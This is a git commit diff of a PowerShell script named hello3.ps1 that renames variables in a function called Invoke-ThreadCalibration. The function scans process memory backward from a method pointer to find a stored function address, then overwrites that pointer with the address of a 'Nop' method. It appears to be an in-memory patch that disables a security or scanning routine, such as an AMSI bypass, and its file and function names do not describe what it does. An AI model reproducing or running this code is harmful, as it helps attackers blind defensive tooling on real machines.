10c64984d098f72ea36b41e76216eb40aef0b90f
fvrsnr <155655459+fvrsnr@users.noreply.github.com>
2026-06-29 10:37:13 -0600

    Refactor Invoke-ThreadCalibration function variables

--- hello3.ps1
+++ hello3.ps1
@@ -1,20 +1,20 @@
 function Invoke-ThreadCalibration {
-    :searchLoop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
+    :searchLoop for($j = $startOff; $j -lt $maxOff; $j += $stepOff){
         [IntPtr] $scanPtr = [Int64] $MethodPointer - $j
-        $memBuf = [byte[]]::new($ReadBytes)
-        $ret = [NtHelpers]::ReadMem($Handle, $scanPtr, $memBuf, $ReadBytes, [ref]$dummy)
+        $memBuf = [byte[]]::new($bufSize)
+        $callRet = [NtHelpers]::ReadMem($Handle, $scanPtr, $memBuf, $bufSize, [ref]$pad)
         for ($i = 0; $i -lt $memBuf.Length; $i += 1) {
             $chunk = [byte[]]($memBuf[$i],$memBuf[$i+1],$memBuf[$i+2],$memBuf[$i+3],$memBuf[$i+4],$memBuf[$i+5],$memBuf[$i+6],$memBuf[$i+7])
             [IntPtr] $val = [bitconverter]::ToInt64($chunk, 0)
             if ($val -eq $funcAddr) {
                 Write-Host "OK $j $i"
-                [IntPtr] $target = [Int64] $scanPtr + $i
+                [IntPtr] $patchAt = [Int64] $scanPtr + $i
                 break searchLoop
             }
         }
     }
     [IntPtr] $hookPtr = [NtHelpers].GetMethod('Nop').MethodHandle.GetFunctionPointer()
-    $arr = [IntPtr[]]($hookPtr)
-    [System.Runtime.InteropServices.Marshal]::Copy($arr, 0, $target, 1)
+    $pArr = [IntPtr[]]($hookPtr)
+    [System.Runtime.InteropServices.Marshal]::Copy($pArr, 0, $patchAt, 1)
     Write-Host "$(( (Get-Date) - $InitialDate).TotalSeconds)s"
 }
